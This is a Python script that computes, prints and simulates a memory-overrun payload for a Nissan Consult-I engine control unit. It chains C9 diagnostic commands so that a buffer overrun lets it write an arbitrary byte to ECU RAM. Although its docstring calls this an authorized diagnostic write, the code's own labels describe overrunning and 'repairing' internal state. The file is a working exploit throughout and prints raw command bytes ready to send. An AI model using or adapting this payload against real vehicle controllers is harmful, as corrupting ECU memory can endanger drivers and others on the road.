#!/usr/bin/env python3
"""Compute and simulate the Consult-I ECU RAM write payload.

Builds the 20-address C9 payload that writes a byte to a chosen address
in $0740-$083F, using the authorized Nissan diagnostic write mechanism.

Usage:
  python3 nissan-write.py --target 0817              # print the payload
  python3 nissan-write.py --target 0817 --sim        # simulate the overrun
  python3 nissan-write.py --target 07B7 --sim        # target at_active flags
"""
import argparse

CS_PAYLOAD  = 0x0740
HIDDEN_ADDR = 0x07C3
HIDDEN_IDX  = 0x07D7
HIDDEN_N    = 0x07E1
FWD_FLAGS   = 0x07E3
C9_SUB_VAL  = 0x07E7
FORWARD_LO  = 0x5D40
FORWARD_HI  = 0x623F


def compute_payload(target, fill=0x5E00):
    """Return 20 C9 addresses that write to `target` ($0740-$083F)."""
    if not 0x0740 <= target <= 0x083F:
        raise ValueError(f"target ${target:04X} outside $0740-$083F")
    t = (target - CS_PAYLOAD) & 0xFF
    return (
        [fill] * 15
        + [0x5E0A, 0x5E0B, 0x5E00 + t, fill, 0x5E00]
    )


def simulate(payload):
    """Simulate c9_find_hidden and one builder frame.

    Returns (ram, stores, builder_result).
    """
    ram = {}

    def rb(a): return ram.get(a, 0)
    def wb(a, v): ram[a] = v & 0xFF
    def rw(a): return rb(a) | (rb(a + 1) << 8)
    def ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)

    cs_argc = len(payload) * 2
    for i, a in enumerate(payload):
        ww(0x08D2 + 2 * i, a)

    wb(HIDDEN_N, 0)
    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)

    stores = []
    for i in range(20):
        if 2 * i >= cs_argc:
            break
        a_val = rw(0x08D2 + 2 * i)
        if not (FORWARD_LO <= a_val < 0x6240):
            if 2 * (i + 1) >= cs_argc:
                break
            continue

        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)

        n = rb(HIDDEN_N)
        addr_dest = HIDDEN_ADDR + ((2 * n) & 0xFF)
        word = a_val - 0x5000
        ww(addr_dest, word)
        stores.append(("addr", i, addr_dest, word))

        n_re = rb(HIDDEN_N)
        idx_dest = HIDDEN_IDX + n_re
        wb(idx_dest, i & 0xFF)
        stores.append(("idx", i, idx_dest, i & 0xFF))

        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)

        if 2 * (i + 1) >= cs_argc:
            break

    # Simulate builder frame
    flags = ram.get(FWD_FLAGS, 0)
    builder = None
    if (flags & 0x01) and (flags & 0x02):
        sub_val = ram.get(C9_SUB_VAL, 0)
        cursor = ram.get(0x07E2, 0)
        idx_val = ram.get(HIDDEN_IDX + cursor, 0)
        builder = {
            "target": CS_PAYLOAD + idx_val,
            "value": sub_val,
            "cursor": cursor,
            "idx": idx_val,
        }

    return ram, stores, builder


def main():
    ap = argparse.ArgumentParser(description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", type=lambda x: int(x, 16), default=0x0817,
        help="target RAM address in hex (default: 0817)")
    ap.add_argument("--fill", type=lambda x: int(x, 16), default=0x5E00,
        help="fill address for positions 0-14 (default: 5E00)")
    ap.add_argument("--sim", action="store_true",
        help="simulate the overrun and print store trace")
    args = ap.parse_args()

    payload = compute_payload(args.target, fill=args.fill)

    print(f"Target: ${args.target:04X}")
    print(f"Payload ({len(payload)} addresses):")
    for i, a in enumerate(payload):
        label = ""
        if i < 15:
            label = "fill"
        elif i == 15:
            label = "repair n/cursor"
        elif i == 16:
            label = "repair flags"
        elif i == 17:
            label = f"target offset ${(args.target - CS_PAYLOAD) & 0xFF:02X}"
        elif i == 18:
            label = "value (H8 FIFO)"
        elif i == 19:
            label = "dummy"
        print(f"  [{i:2d}] ${a:04X}  {label}")

    print(f"\nC9 command bytes:")
    cmd = b"".join(bytes([0xC9, a >> 8, a & 0xFF]) for a in payload)
    print(f"  {cmd.hex(' ')}")

    if args.sim:
        print(f"\n--- Simulation ---")
        ram, stores, builder = simulate(payload)

        print(f"\nOverrun stores:")
        for kind, i, dest, val in stores:
            tag = f"{'addr':>4s}" if kind == "addr" else f"{'idx':>4s}"
            vfmt = f"${val:04X}" if kind == "addr" else f"${val:02X}"
            print(f"  i={i:2d} {tag} -> ${dest:04X} = {vfmt}")

        print(f"\nPost-overrun state:")
        for a in [HIDDEN_N, 0x07E2, FWD_FLAGS, C9_SUB_VAL]:
            print(f"  ${a:04X} = ${ram.get(a, 0):02X}")

        if builder:
            print(f"\nBuilder frame 0 write:")
            print(f"  cs_payload[${builder['idx']:02X}] = ${builder['value']:02X}")
            print(f"  -> ${builder['target']:04X} = ${builder['value']:02X}")
            print(f"  (actual value determined by H8 FIFO, not this byte)")
        else:
            print(f"\nBuilder: flags not set, no write")


if __name__ == "__main__":
    main()
